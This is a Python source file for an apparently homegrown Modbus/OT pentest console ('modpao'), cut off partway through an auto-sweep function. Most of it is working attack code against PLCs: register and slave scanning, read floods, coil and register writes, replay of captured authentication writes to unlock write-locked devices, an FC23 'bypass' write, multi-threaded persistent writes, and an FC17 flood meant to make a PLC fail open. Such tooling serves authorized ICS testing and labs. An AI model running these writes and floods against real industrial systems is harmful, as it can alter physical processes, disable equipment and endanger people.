#!/usr/bin/env python3
"""
modpao.py - Generic Modbus Pentest CLI (SET / Metasploit style)  

Universal Modbus/OT pentest console with multi-session resume, tab-complete,
per-session findings + audit trail, confirm-on-destructive, and auto-reconnect.

    pip install "pymodbus>=3.8"
    python3 modpao.py                # resumes last session
    python3 modpao.py --ip 172.19.5.3

FOR AUTHORIZED TESTING ONLY (labs / systems you own or are engaged to test).
"""
import argparse
import atexit
import datetime
import inspect
import json
import os
import struct
import sys
import threading
import time
import socket
import ipaddress
import shutil
import subprocess
import concurrent.futures
import traceback
import contextlib

try:
    from pymodbus.client import ModbusTcpClient
except Exception:
    print("pymodbus not installed: pip install 'pymodbus>=3.8'")
    sys.exit(1)

# optional tab-complete / history
try:
    import readline
    HAVE_RL = True
except Exception:
    HAVE_RL = False


# ------------------------------------------------------------------ colors ---
class C:
    OR = "\033[38;5;208m"; OR2 = "\033[38;5;214m"; RED = "\033[38;5;196m"
    CY = "\033[96m"; GR = "\033[92m"; RD = "\033[91m"; YL = "\033[93m"
    MG = "\033[95m"; BD = "\033[1m"; DIM = "\033[2m"; RS = "\033[0m"


def info(m):  print(f"{C.CY}{m}{C.RS}")
def ok(m):    print(f"{C.GR}[+] {m}{C.RS}")
def err(m):   print(f"{C.RD}[x] {m}{C.RS}")
def warn(m):  print(f"{C.YL}[!] {m}{C.RS}")
def vuln(m):  print(f"{C.RED}{C.BD}[VULN] {m}{C.RS}")
def vprint(m):
    if VERBOSE: print(f"{C.DIM}[v] {m}{C.RS}")


# ---------------------------------------------------------------- state -----
STORE = "modpao_sessions.json"
HISTORY = ".modpao_history"


def blank_session(name="default"):
    return {"name": name, "ip": "", "port": 502, "uid": 1, "slave": None,
            "auth_map": {}, "auth_fc": "fc16", "wordlist": "built-in",
            "decode": "int", "findings": [], "tags": []}


STATE = {"current": 0, "sessions": [blank_session()]}
VERBOSE = False
LIVE = None  # a held, already-authed OT connection (from 'unlock')


@contextlib.contextmanager
def conn(uid):
    """Use the held 'unlock' connection if present, else open a fresh one."""
    if LIVE is not None:
        yield LIVE
    else:
        with OT(sess()["ip"], sess()["port"], uid) as ot:
            yield ot


def sess():
    return STATE["sessions"][STATE["current"]]


def autosave():
    try:
        with open(STORE, "w") as f:
            json.dump(STATE, f, indent=2)
    except OSError as e:
        warn(f"autosave failed: {e}")


def load_state():
    global STATE
    if os.path.exists(STORE):
        try:
            with open(STORE) as f:
                data = json.load(f)
            if data.get("sessions"):
                STATE = data
                STATE["current"] = min(STATE["current"], len(STATE["sessions"]) - 1)
                return True
        except Exception as e:
            warn(f"could not load {STORE}: {e}")
    return False


# --------------------------------------------------------- findings / audit --
def record_finding(kind, detail):
    sess()["findings"].append({
        "ts": datetime.datetime.now().isoformat(timespec="seconds"),
        "kind": kind, "detail": detail,
    })
    autosave()


def audit(line):
    fn = f"modpao_{sess()['name']}.audit.log"
    try:
        with open(fn, "a") as f:
            f.write(f"{datetime.datetime.now().isoformat(timespec='seconds')}  "
                    f"[{sess()['ip']}:{sess()['port']}]  {line}\n")
    except OSError:
        pass


# ------------------------------------------------------------- addr parser ---
def parse_addrs(spec):
    out = []
    for part in str(spec).split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(part))
    return out


# ---------------------------------------------------------------- decoders ---
def decode(regs, mode):
    mode = (mode or "int").lower()
    if mode == "hex":
        return [f"0x{r:04X}" for r in regs]
    if mode == "ascii":
        s = "".join(chr((r >> 8) & 0xFF) + chr(r & 0xFF) for r in regs)
        return repr(s.replace("\x00", ""))
    if mode == "f32":
        v = []
        for i in range(0, len(regs) - 1, 2):
            comb = (regs[i] << 16) | regs[i + 1]
            v.append(round(struct.unpack("!f", struct.pack("!I", comb))[0], 4))
        return v
    if mode == "time":
        out = []
        for r in regs:
            h, rem = divmod(r, 3600); m, s = divmod(rem, 60)
            out.append(f"{h:02d}:{m:02d}:{s:02d}")
        return out
    return list(regs)


# ------------------------------------------------------------- flag parser ---
def split_flags(tokens):
    pos, flags, i = [], {}, 0
    while i < len(tokens):
        t = tokens[i]
        if t in ("-a", "brute", "--flood", "-y", "--nmap", "--add", "--multi", "-F", "-v", "--fc23", "-T", "--no-crc", "--deep"):
            flags[t.lstrip("-")] = True
        elif t in ("-d", "-u", "-sl", "-s", "-t", "-D", "-p", "--count"):
            key = t.lstrip("-")
            flags[key] = tokens[i + 1] if i + 1 < len(tokens) else ""
            i += 1
        else:
            pos.append(t)
        i += 1
    return pos, flags


def uid_from(flags):
    return int(flags.get("u", sess()["uid"]))


def confirm(msg, flags):
    if flags.get("y"):
        return True
    try:
        return input(f"{C.YL}[?] {msg} (y/N)> {C.RS}").strip().lower() == "y"
    except (EOFError, KeyboardInterrupt):
        print(); return False


# ------------------------------------------------------------ modbus client --
def _id_kw(func, uid):
    params = inspect.signature(func).parameters
    for n in ("device_id", "slave", "unit"):
        if n in params:
            return {n: uid}
    return {}


class OT:
    def __init__(self, ip, port, uid):
        self.ip, self.port, self.uid = ip, port, uid
        self.c = ModbusTcpClient(ip, port=port, timeout=3)

    def __enter__(self):
        if not self.c.connect():
            raise ConnectionError(f"cannot connect {self.ip}:{self.port}")
        return self

    def __exit__(self, *a):
        self.c.close()

    def _reconnect(self):
        try:
            self.c.close(); time.sleep(0.3)
            return self.c.connect()
        except Exception:
            return False

    def _call(self, fn, *a, **kw):
        """one retry with reconnect ONLY on real comms failure.
        A Modbus exception (e.g. illegal address) means the device DID reply,
        so we return None (no data) without reconnecting - keeps big scans fast."""
        for attempt in (1, 2):
            rr = None
            try:
                rr = fn(*a, **kw)
            except Exception as e:
                vprint(f"{getattr(fn,'__name__','call')} err: {e}")
                rr = None
            if rr is not None:
                # device responded (data or a modbus exception) -> link is alive
                return rr if not rr.isError() else None
            # no response at all -> connection likely dropped; reconnect once
            if attempt == 1:
                vprint("comms hiccup, reconnecting...")
                if not self._reconnect():
                    return None
        return None

    def _read(self, fn, addr, count):
        rr = self._call(fn, addr, count=count, **_id_kw(fn, self.uid))
        if rr is None:
            return None
        return rr.bits[:count] if getattr(rr, "bits", None) else rr.registers

    def read_c(self, a, n=1):  return self._read(self.c.read_coils, a, n)
    def read_di(self, a, n=1): return self._read(self.c.read_discrete_inputs, a, n)
    def read_h(self, a, n=1):  return self._read(self.c.read_holding_registers, a, n)
    def read_ir(self, a, n=1): return self._read(self.c.read_input_registers, a, n)

    def write_c(self, a, v):
        return self._call(self.c.write_coil, a, bool(v), **_id_kw(self.c.write_coil, self.uid)) is not None

    def write_h(self, a, v):
        return self._call(self.c.write_register, a, int(v), **_id_kw(self.c.write_register, self.uid)) is not None

    def write_hs(self, a, vals):
        return self._call(self.c.write_registers, a, vals, **_id_kw(self.c.write_registers, self.uid)) is not None

    def write_cs(self, a, vals):
        return self._call(self.c.write_coils, a, vals, **_id_kw(self.c.write_coils, self.uid)) is not None

    def fc23(self, waddr, vals, raddr=None, rcount=1):
        if raddr is None:
            raddr = waddr          # read the same reg we write (like solve.py)
        kw = {"read_address": raddr, "read_count": rcount,
              "write_address": waddr, "values": vals}
        kw.update(_id_kw(self.c.readwrite_registers, self.uid))
        rr = self._call(self.c.readwrite_registers, **kw)
        return rr is not None, rr

    def device_info(self):
        fn = getattr(self.c, "read_device_information", None)
        if fn:
            try:
                rr = fn()
                if rr and not rr.isError():
                    return getattr(rr, "information", str(rr))
            except Exception as e:
                return f"unsupported/err: {e}"
        return None


def tag_for(addr, typ=None):
    for t in sess().get("tags", []):
        if t["addr"] == addr and (typ is None or t["type"] == typ):
            return t["name"]
    return ""   # no auto %QW/%MW tag - only user-defined tags show


def _apply_auth(ot):
    fc = sess().get("auth_fc", "fc16")
    for reg, vals in sess()["auth_map"].items():
        vals = [int(v) for v in (vals if isinstance(vals, list) else [vals])]
        reg = int(reg)
        if fc == "fc23":
            ot.fc23(reg, vals, raddr=reg, rcount=len(vals))
        elif fc == "fc06":
            for i, v in enumerate(vals):
                ot.write_h(reg + i, v)
        else:
            ot.write_hs(reg, vals)
        time.sleep(0.03)   # let each auth write settle (some PLCs need this)
    vprint(f"auth replayed via {fc} to {len(sess()['auth_map'])} regs")
    vprint(f"auth replayed ({fc}) from session.auth_map")


# =================================================================== MENUS ===
def m_info(flags):
    with OT(sess()["ip"], sess()["port"], uid_from(flags)) as ot:
        info(f"target {ot.ip}:{ot.port} uid={ot.uid}")
        di = ot.device_info()
        ok(f"FC43 device info: {di}") if di else warn("FC43 not available")
    m_S()


def _one_read(ip, port, uid, typ, chunk):
    res = {}
    try:
        with OT(ip, port, uid) as o:
            fn = {"c": o.read_c, "di": o.read_di, "h": o.read_h, "ir": o.read_ir}[typ]
            for a in chunk:
                v = fn(a, 1); res[a] = None if v is None else v[0]
    except Exception as e:
        vprint(f"reader thread: {e}")
        for a in chunk:
            res.setdefault(a, None)
    return res


def _contiguous_runs(addrs):
    runs, cur = [], []
    for a in sorted(set(addrs)):
        if cur and a == cur[-1] + 1:
            cur.append(a)
        else:
            if cur: runs.append(cur)
            cur = [a]
    if cur: runs.append(cur)
    return runs


TYPE_NAME = {"c": "Coil", "di": "DiscreteInput", "h": "HoldingRegister", "ir": "InputRegister"}


def _collect(ot, typ, addrs, multi=False, threads=1):
    fmap = {"c": ot.read_c, "di": ot.read_di, "h": ot.read_h, "ir": ot.read_ir}
    fn = fmap.get(typ)
    if not fn:
        return None
    values = {}
    if multi and len(addrs) > 1:
        maxblk = 1968 if typ in ("c", "di") else 125  # modbus per-request limits
        reqs = 0
        for run in _contiguous_runs(addrs):
            for i in range(0, len(run), maxblk):
                sub = run[i:i + maxblk]
                block = fn(sub[0], len(sub)); reqs += 1
                for j, a in enumerate(sub):
                    values[a] = None if block is None else block[j]
    elif threads > 1 and len(addrs) > 1:
        chunks = [addrs[i::threads] for i in range(threads) if addrs[i::threads]]
        vprint(f"threaded read across {len(chunks)} workers")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            for res in ex.map(lambda ch: _one_read(ot.ip, ot.port, ot.uid, typ, ch), chunks):
                values.update(res)
    else:
        for a in addrs:
            v = fn(a, 1); values[a] = None if v is None else v[0]
    return values


def _read_header():
    print(f"  {C.DIM}{'Type':16}{'Addr':>6}  {'Tag':12}Value{C.RS}")


def _read_dispatch(ot, typ, addrs, dmode, multi=False, threads=1, filt=False):
    if typ not in TYPE_NAME:
        err(f"unknown type '{typ}' - use c (Coil) | di (DiscreteInput) | h (HoldingRegister) | ir (InputRegister)")
        return
    values = _collect(ot, typ, addrs, multi, threads)
    name = TYPE_NAME[typ]
    _read_header()
    if dmode == "f32" and typ in ("h", "ir"):
        items = sorted(values.items())
        for i in range(0, len(items) - 1, 2):
            (a0, v0), (a1, v1) = items[i], items[i + 1]
            if v0 is None or v1 is None:
                cell = f"{C.RD}<err>{C.RS}"
            else:
                fv = decode([v0, v1], "f32")[0]
                cell = f"{C.GR}{fv}{C.RS}  {C.DIM}(regs {a0},{a1}={v0},{v1}){C.RS}"
            print(f"  {name:16}{a0:>6}  {C.DIM}{tag_for(a0, typ):12}{C.RS}{cell}")
        if len(items) % 2:
            warn(f"f32 needs register pairs - addr {items[-1][0]} has no partner")
        return
    shown = 0
    for a in sorted(values):
        val = values[a]
        if filt and (val == 0 or val is False):
            continue
        tag = tag_for(a, typ)
        if val is None:
            cell = f"{C.RD}<err>{C.RS}"
        else:
            extra = ""
            if typ in ("h", "ir") and dmode not in ("int", None):
                extra = f"  [{dmode}:{decode([val], dmode)}]"
            color = C.GR if (val not in (0, False)) else C.DIM
            cell = f"{color}{val}{C.RS}{extra}"
        print(f"  {name:16}{a:>6}  {C.DIM}{tag:12}{C.RS}{cell}")
        shown += 1
    if filt:
        info(f"{shown} shown, {len(values) - shown} zero/false hidden (-F)")


def m_enum(flags, args):
    if not args:
        info("ENUM: read TYPE ADDR | scan TYPE RANGE | scan -u RANGE | flood TYPE ADDR   (TYPE = c|di|h|ir)")
        return
    uid = uid_from(flags); dmode = flags.get("d", sess()["decode"]); sub = args[0]
    with conn(uid) as ot:
        if flags.get("a") and sess()["auth_map"] and LIVE is None:
            _apply_auth(ot)
        if sub == "read":
            _read_dispatch(ot, args[1], parse_addrs(args[2]), dmode,
                           multi=bool(flags.get("multi")), threads=int(flags.get("t", 1)),
                           filt=bool(flags.get("F")))
        elif sub == "scan":
            what = args[1]; rng = parse_addrs(args[2]) if len(args) > 2 else list(range(0, 4097))
            if what == "-u":
                info("slave scan...")
                for u in rng:
                    ot.uid = u
                    v = ot.read_h(0, 1)
                    if v is not None:
                        ok(f"slave {u} -> hreg[0]={v[0]}")
                return
            if what not in TYPE_NAME:
                err(f"scan TYPE must be c|di|h|ir (got '{what}')"); return
            name = TYPE_NAME[what]
            info(f"scanning {name} {rng[0]}..{rng[-1]} (showing non-zero / True only)")
            values = _collect(ot, what, rng, multi=bool(flags.get("multi")) or len(rng) > 8)
            _read_header()
            found = 0
            for a in sorted(values):
                val = values[a]
                if val in (0, False, None):
                    continue
                print(f"  {name:16}{a:>6}  {C.DIM}{tag_for(a, what):12}{C.RS}{C.GR}{val}{C.RS}")
                found += 1
            ok(f"{found} non-zero")
        elif sub == "flood":
            m_flood_read(flags, args[1:])
        else:
            err("ENUM: read | scan | flood")


# --------------------------------------------------------- FLOOD READ --------
def _flood_fmt_last(block, typ, dmode):
    """pretty-print the most recent value read (for the live stat line)."""
    if block is None:
        return f"{C.RD}<err>{C.RS}"
    if typ in ("h", "ir") and dmode and dmode not in ("int", None):
        try:
            return str(decode(block, dmode))
        except Exception:
            pass
    return str(block[0] if len(block) == 1 else list(block))


def _flood_scalar(block, typ, dmode):
    """pull one numeric value out of a read, for value-range (min/max) tracking."""
    if not block:
        return None
    if typ in ("h", "ir") and dmode == "f32":
        try:
            d = decode(block, "f32")
            return d[0] if d else None
        except Exception:
            return None
    v = block[0]
    if isinstance(v, bool):
        return int(v)
    return v if isinstance(v, (int, float)) else None


def _flood_read_line(stats, el, typ, dmode):
    el = el or 1e-9
    last = _flood_fmt_last(stats["last"], typ, dmode)
    avg_ms = (stats["lat_sum"] / stats["lat_n"] * 1000.0) if stats["lat_n"] else 0.0
    print(f"  {C.DIM}reads={stats['reads']:<7} err={stats['err']:<5} "
          f"rate={stats['reads']/el:7.1f}/s  lat~{avg_ms:5.2f}ms  last={last}{C.RS}")


def m_flood_read(flags, args):
    """Read the SAME address(es) over and over as fast as possible (throughput /
    stress / liveness test), printing a live rate + error counter.
    Different from MONITOR (paced table poll) and WATCH (delta alert): no pacing,
    it hammers reads at max speed. The read-side twin of persist --flood."""
    if len(args) < 2:
        info("FLOOD read - hammer the same address(es) at max speed, live rate/latency stats")
        print("    flood TYPE ADDR [SECONDS]    TYPE = c|di|h|ir   (ADDR = 5 or range 1-10)")
        print(f"  {C.DIM}how long: SECONDS as a word, or -D sec  (default 10s, 0 = until Ctrl-C)")
        print("  flags: --count N (stop after N reads)  -t N (threads)  -d f32|ascii|hex  -u uid")
        print("  reports: reads/s, error %, latency min/avg/max (ms), value range seen")
        print(f"  ex: flood h 1027 | flood h 1027 30 | flood h 1024-1030 -t 8 | flood h 40050 -d f32{C.RS}")
        return
    typ = args[0]
    if typ not in TYPE_NAME:
        err("TYPE must be c (Coil) | di (DiscreteInput) | h (HoldingRegister) | ir (InputRegister)")
        return
    addrs = parse_addrs(args[1])
    if not addrs:
        err("no address"); return

    # how long: -D flag wins, else a positional SECONDS, else default 10s
    if "D" in flags:
        dur = float(flags["D"])
    elif len(args) > 2:
        try:
            dur = float(args[2])
        except ValueError:
            err(f"SECONDS must be a number (got '{args[2]}') - e.g. flood {typ} {args[1]} 30"); return
    else:
        dur = 10.0
    count = int(flags["count"]) if "count" in flags else 0
    threads = max(1, int(flags.get("t", 1)))
    uid = uid_from(flags)
    dmode = flags.get("d", sess()["decode"])
    n = len(addrs); blk0 = addrs[0]
    name = TYPE_NAME[typ]

    span = f"{addrs[0]}" + (f"-{addrs[-1]}" if n > 1 else "")
    how = f"count={count}" if count else (f"{dur:g}s" if dur else "until Ctrl-C")
    info(f"FLOOD read {name} {span}  {threads} thread(s)  {how}  (max rate -> "
         f"{sess()['ip'] or '?'}:{sess()['port']})")
    print(f"  {C.DIM}Ctrl-C to stop early{C.RS}")

    stop = threading.Event()
    stats = {"reads": 0, "err": 0, "last": None,
             "lat_sum": 0.0, "lat_n": 0, "lat_min": float("inf"), "lat_max": 0.0,
             "vmin": None, "vmax": None}

    def worker():
        try:
            with OT(sess()["ip"], sess()["port"], uid) as o:
                fn = {"c": o.read_c, "di": o.read_di, "h": o.read_h, "ir": o.read_ir}[typ]
                while not stop.is_set():
                    t_req = time.perf_counter()
                    block = fn(blk0, n)
                    dt = time.perf_counter() - t_req
                    if block is None:
                        stats["err"] += 1
                    else:
                        stats["reads"] += 1
                        stats["last"] = block
                        stats["lat_sum"] += dt; stats["lat_n"] += 1
                        if dt < stats["lat_min"]: stats["lat_min"] = dt
                        if dt > stats["lat_max"]: stats["lat_max"] = dt
                        sv = _flood_scalar(block, typ, dmode)
                        if sv is not None:
                            if stats["vmin"] is None or sv < stats["vmin"]: stats["vmin"] = sv
                            if stats["vmax"] is None or sv > stats["vmax"]: stats["vmax"] = sv
                    if count and (stats["reads"] + stats["err"]) >= count:
                        stop.set(); break
        except Exception as e:
            vprint(f"flood-read thread: {e}")

    t0 = time.time(); last_print = 0.0
    ths = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ths:
        t.start()
    try:
        while any(t.is_alive() for t in ths):
            el = time.time() - t0
            if not count and dur and el >= dur:
                stop.set(); break
            if el - last_print >= 0.5:
                _flood_read_line(stats, el, typ, dmode); last_print = el
            time.sleep(0.05)
    except KeyboardInterrupt:
        stop.set(); print(); info("(stopped)")
    for t in ths:
        t.join(timeout=1.0)

    el = (time.time() - t0) or 1e-9
    last = _flood_fmt_last(stats["last"], typ, dmode)
    if stats["reads"] == 0 and stats["err"] == 0:
        err(f"no reads completed - cannot reach {sess()['ip'] or '?'}:{sess()['port']} "
            f"(check ip/port/uid, or -v for the real error)")
        return
    total = stats["reads"] + stats["err"]
    errpct = (stats["err"] / total * 100.0) if total else 0.0
    avg_ms = (stats["lat_sum"] / stats["lat_n"] * 1000.0) if stats["lat_n"] else 0.0
    ok(f"flood read done: reads={stats['reads']} err={stats['err']} ({errpct:.1f}%) "
       f"time={el:.2f}s rate={stats['reads']/el:.1f}/s")
    if stats["lat_n"]:
        print(f"  {C.DIM}latency(ms): min={stats['lat_min']*1000:.2f} "
              f"avg={avg_ms:.2f} max={stats['lat_max']*1000:.2f}  ({threads} thread(s)){C.RS}")
    if stats["vmin"] is not None:
        if stats["vmin"] == stats["vmax"]:
            print(f"  {C.DIM}value: constant {stats['vmin']} (never changed during the flood){C.RS}")
        else:
            print(f"  {C.DIM}value: moved {stats['vmin']} .. {stats['vmax']} during the flood{C.RS}")
    print(f"  {C.DIM}last={last}{C.RS}")
    record_finding("floodread",
                   f"{typ} {span} x{stats['reads']} err={stats['err']}({errpct:.0f}%) "
                   f"@ {stats['reads']/el:.0f}/s avglat={avg_ms:.1f}ms")


def m_monitor(flags, args):
    if len(args) < 2:
        info("MONITOR: TYPE ADDR INTERVAL   flags: -T (rows=addr)  --multi (faster)")
        return
    typ = args[0]
    if typ not in TYPE_NAME:
        err("TYPE must be c|di|h|ir"); return
    addrs = parse_addrs(args[1]); iv = float(args[2]) if len(args) > 2 else 2.0
    uid = uid_from(flags)
    transpose = bool(flags.get("T"))
    multi = True  # monitor always block-reads for speed
    info(f"polling {TYPE_NAME[typ]} {addrs} every {iv}s "
         f"({'rows=addr' if transpose else 'cols=addr'} table, Ctrl-C to stop)")
    try:
        with OT(sess()["ip"], sess()["port"], uid) as ot:
            if not transpose:
                print("  " + C.DIM + "Time".ljust(10)
                      + "".join(f"{a:>9}" for a in addrs) + C.RS)
            n = 0
            while True:
                n += 1
                vals = _collect(ot, typ, addrs, multi=multi)
                ts = datetime.datetime.now().strftime("%H:%M:%S")
                if transpose:
                    print("\033[2J\033[H", end="")
                    print(f"  {C.OR}poll #{n}  {ts}  {TYPE_NAME[typ]}{C.RS}")
                    print(f"  {C.DIM}{'Addr':>6}  {'Tag':12}Value{C.RS}")
                    for a in addrs:
                        v = vals.get(a)
                        col = C.RD if v is None else (C.GR if v not in (0, False) else C.DIM)
                        print(f"  {a:>6}  {C.DIM}{tag_for(a, typ):12}{C.RS}{col}{v}{C.RS}")
                else:
                    cells = "".join(f"{str(vals.get(a)):>9}" for a in addrs)
                    print(f"  {ts.ljust(10)}{C.GR}{cells}{C.RS}")
                time.sleep(iv)
    except KeyboardInterrupt:
        info("monitor stopped")


def m_watch(flags, args):
    if len(args) < 2:
        info("WATCH: watch h ADDR INTERVAL [thr ADDR >|<|= VAL]"); return
    typ = args[0]; addrs = parse_addrs(args[1]); iv = float(args[2]) if len(args) > 2 else 2.0
    thr = None
    if "thr" in args:
        i = args.index("thr"); thr = (int(args[i+1]), args[i+2], float(args[i+3]))
    uid = uid_from(flags)
    fmap = {"c": "read_c", "di": "read_di", "h": "read_h", "ir": "read_ir"}
    info(f"watching {typ} {addrs} (delta)" + (f", thr reg{thr[0]} {thr[1]} {thr[2]}" if thr else ""))
    prev = {}
    try:
        with OT(sess()["ip"], sess()["port"], uid) as ot:
            reader = getattr(ot, fmap[typ])
            while True:
                for a in addrs:
                    v = reader(a, 1); cur = None if v is None else v[0]; old = prev.get(a)
                    if old is not None and cur != old:
                        print(f"  {C.YL}d {typ} {a}: {old} -> {cur}{C.RS}")
                    prev[a] = cur
                    if thr and a == thr[0] and cur is not None:
                        op, tv = thr[1], thr[2]
                        if (op == ">" and cur > tv) or (op == "<" and cur < tv) or (op == "=" and cur == tv):
                            vuln(f"threshold hit: reg{a}={cur} {op} {tv}")
                time.sleep(iv)
    except KeyboardInterrupt:
        info("watch stopped")


def _one_write(ip, port, uid, typ, chunk, val):
    n = 0
    try:
        with OT(ip, port, uid) as o:
            for a in chunk:
                if (o.write_c(a, val) if typ == "c" else o.write_h(a, val)):
                    n += 1
    except Exception as e:
        vprint(f"writer thread: {e}")
    return n


def m_write(flags, args):
    uid = uid_from(flags)
    if not args:
        typ = input("  type (c=Coil / h=HoldingReg)> ").strip()
        addrspec = input("  address (5 or 1-10)> ").strip()
        val = int(input("  value (coil 0/1, reg number)> ").strip())
    else:
        typ, addrspec, val = args[0], args[1], int(args[2])
    if typ not in ("c", "h"):
        err("write TYPE must be c (Coil) or h (HoldingRegister)"); return
    addrs = parse_addrs(addrspec)
    if not addrs:
        err("no address"); return
    fc23 = bool(flags.get("fc23")); multi = bool(flags.get("multi")); threads = int(flags.get("t", 1))
    # -a on a locked PLC: match the write FC to the auth FC automatically
    if flags.get("a") and typ == "h" and not (fc23 or multi or threads > 1):
        afc = sess().get("auth_fc", "fc16")
        if afc == "fc23":
            fc23 = True; vprint("-a with auth_fc=fc23 -> writing hreg via FC23")
        elif afc == "fc16":
            multi = True; vprint("-a with auth_fc=fc16 -> writing hreg via FC16")
    # coils never use FC23 (register-only); auth still replays via its own FC
    mode = "FC23" if fc23 else ("MULTI(FC15/16)" if multi else ("THREADS" if threads > 1 else "SINGLE(FC05/06)"))
    if not confirm(f"WRITE {typ} {addrspec}={val} ({len(addrs)} reg) via {mode} to {sess()['ip']}", flags):
        info("cancelled"); return
    with conn(uid) as ot:
        if flags.get("a") and sess()["auth_map"] and LIVE is None:
            _apply_auth(ot)
        _rfn = ot.read_c if typ == "c" else ot.read_h
        befores = {}
        if VERBOSE:
            for a in addrs:
                r = _rfn(a, 1); befores[a] = None if not r else r[0]
            print(f"  {C.DIM}[before] {addrspec} = {[befores[a] for a in addrs]}{C.RS}")
        wrote = 0
        if fc23:
            if typ != "h":
                err("FC23 writes holding registers only (not coils)"); return
            for a in addrs:
                if ot.fc23(a, [val])[0]:
                    wrote += 1
            vprint("wrote via FC23 (bypass) per address")
        elif multi and len(addrs) > 1:
            if typ == "c":
                wrote = len(addrs) if ot.write_cs(addrs[0], [bool(val)] * len(addrs)) else 0
            else:
                wrote = len(addrs) if ot.write_hs(addrs[0], [val] * len(addrs)) else 0
            vprint(f"block write {addrs[0]}..{addrs[-1]} in one request")
        elif threads > 1 and len(addrs) > 1:
            chunks = [addrs[i::threads] for i in range(threads) if addrs[i::threads]]
            vprint(f"threaded write across {len(chunks)} workers")
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                wrote = sum(ex.map(lambda ch: _one_write(ot.ip, ot.port, ot.uid, typ, ch, val), chunks))
        else:
            for a in addrs:
                if (ot.write_c(a, val) if typ == "c" else ot.write_h(a, val)):
                    wrote += 1
        rfn = ot.read_c if typ == "c" else ot.read_h
        want = bool(val) if typ == "c" else val
        stuck = 0
        for a in addrs:
            r = rfn(a, 1); af = None if not r else r[0]
            if VERBOSE:
                mark = f"{C.GR}OK{C.RS}" if af == want else f"{C.RD}FAIL{C.RS}"
                print(f"  {C.DIM}[after]{C.RS}  {TYPE_NAME[typ]} {a}: "
                      f"before={befores.get(a)} -> after={af}  {mark}")
            if af == want:
                stuck += 1
        if stuck == len(addrs):
            ok(f"wrote {TYPE_NAME[typ]} {addrspec}={val} via {mode}: {stuck}/{len(addrs)} verified")
            record_finding("write", f"{typ} {addrspec}={val} via {mode} x{stuck}")
        elif wrote:
            if typ == "c":
                warn(f"sent {wrote}, only {stuck}/{len(addrs)} stuck - this coil is likely "
                     f"DRIVEN by the PLC program (it re-sets the output each scan). not writable.")
            else:
                warn(f"sent {wrote}, only {stuck}/{len(addrs)} stuck - register write-locked or "
                     f"PLC-overwritten. try:  -a (auth)  and/or  --fc23")
        else:
            if typ == "c":
                err(f"coil write rejected ({addrspec}) - coil may be read-only / firewalled")
            else:
                err(f"write rejected ({addrspec}) - try --fc23, or brute + -a to auth first")


# ---------------------------------------------------------------- PERSIST ----
def _persist_worker(ip, port, uid, typ, addr, val, stop, ctr):
    try:
        with OT(ip, port, uid) as ot:
            while not stop.is_set():
                (ot.write_c if typ == "c" else ot.write_h)(addr, val); ctr[0] += 1
    except Exception:
        pass


def m_persist(flags, args):
    if not args:
        info("PERSIST: persist h ADDR VAL -t N -D sec | fc23 h ADDR VAL "
             "| persist --flood h ADDR VAL | persist all ADDR VAL"); return
    uid = uid_from(flags); threads = int(flags.get("t", 10)); dur = float(flags.get("D", 30))

    if args[0] == "fc23":
        addr, val = int(args[2]), int(args[3])
        if not confirm(f"FC23 write {addr}={val}", flags): return
        with OT(sess()["ip"], sess()["port"], uid) as ot:
            good, rr = ot.fc23(addr, [val])
            (ok if good else err)(f"FC23 {addr}={val}: {'ok' if good else rr}")
            if good: record_finding("persist", f"FC23 {addr}={val}")
        return
    if flags.get("flood"):
        typ, addr, val = args[0], int(args[1]), int(args[2])
        if not confirm(f"FC17 FLOOD {threads}t {dur}s -> {sess()['ip']}", flags): return
        _flood(sess()["ip"], sess()["port"], uid, typ, addr, val, threads, dur); return
    if args[0] == "all":
        addr, val = int(args[1]), int(args[2])
        if not confirm(f"try all write FCs on {addr}={val}", flags): return
        _persist_all(sess()["ip"], sess()["port"], uid, addr, val); return

    typ, addr, val = args[0], int(args[1]), int(args[2])
    if not confirm(f"PERSIST {threads}t {dur}s {typ} {addr}={val}", flags): return
    stop = threading.Event(); ctr = [0]
    info(f"persist {typ} {addr}={val} {threads} threads {dur}s")
    ths = [threading.Thread(target=_persist_worker,
           args=(sess()["ip"], sess()["port"], uid, typ, addr, val, stop, ctr), daemon=True)
           for _ in range(threads)]
    for t in ths: t.start()
    try: time.sleep(dur)
    except KeyboardInterrupt: pass
    stop.set(); time.sleep(0.5)
    ok(f"persist done: {ctr[0]} writes")
    record_finding("persist", f"{typ} {addr}={val} x{ctr[0]}")


def _flood(ip, port, uid, typ, addr, val, threads, dur):
    warn(f"FC17 flood: {threads} threads {dur}s (fail-open >100 req)")
    stop = threading.Event(); ctr = [0]

    def worker():
        try:
            with OT(ip, port, uid) as ot:
                while not stop.is_set():
                    ot.fc23(addr, [val], raddr=addr, rcount=1); ctr[0] += 1
        except Exception:
            pass
    ths = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ths: t.start()
    time.sleep(dur); stop.set(); time.sleep(0.5)
    try:
        with OT(ip, port, uid) as ot:
            rb = (ot.read_c if typ == "c" else ot.read_h)(addr, 1)
            if rb and rb[0] == (bool(val) if typ == "c" else val):
                vuln(f"flood succeeded: {addr}={rb[0]} after {ctr[0]} reqs")
                record_finding("flood", f"{typ} {addr}={val} via FC17 fail-open")
            else:
                warn(f"flood done ({ctr[0]} reqs), not stuck (rb={rb})")
    except Exception as e:
        err(str(e))


def _persist_all(ip, port, uid, addr, val):
    info(f"trying all write FCs on hreg {addr}={val}")
    with OT(ip, port, uid) as ot:
        res = {"FC06": ot.write_h(addr, val), "FC16": ot.write_hs(addr, [val]),
               "FC23": ot.fc23(addr, [val])[0]}
        rb = ot.read_h(addr, 1)
    for fc, r in res.items():
        (ok if r else err)(f"{fc}: {'accepted' if r else 'rejected'}")
    ok(f"readback {addr} = {None if rb is None else rb[0]}")
    good = [fc for fc, r in res.items() if r]
    if good: record_finding("persist", f"{addr}={val} via {','.join(good)}")


# ------------------------------------------------------------------- AUTO ----
def _sweep_slice(ip, port, uid, typ, s, e, chunk, deep):
    hits = []
    try:
        with OT(ip, port, uid) as o:
            fn = {"c": o.read_c, "di": o.read_di, "h": o.read_h, "ir": o.read_ir}[typ]
            a = s; consec = 0
            while a <= e:
                n = min(chunk, e - a + 1)
                block = fn(a, n)
                if block is None:
                    consec += 1
                    if not deep and consec >= 5:
                        break               # hit illegal addresses -> end of range
                else:
                    consec = 0
